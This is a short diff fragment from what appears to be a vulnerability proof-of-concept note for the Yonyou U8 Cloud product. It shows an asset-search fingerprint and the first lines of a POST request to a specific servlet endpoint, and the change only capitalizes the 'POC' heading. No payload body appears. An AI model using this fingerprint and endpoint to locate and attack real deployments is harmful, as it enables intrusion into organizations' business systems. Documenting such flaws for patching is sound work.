@@ -5,7 +5,7 @@
 app="用友U8 Cloud"
 ```
 
-## poc
+## POC
 ```
 POST /servlet/~iufo/nc.itf.iufo.mobilereport.data.KeyWordDetailReportQuery  HTTP/1.1
 host:127.0.0.1
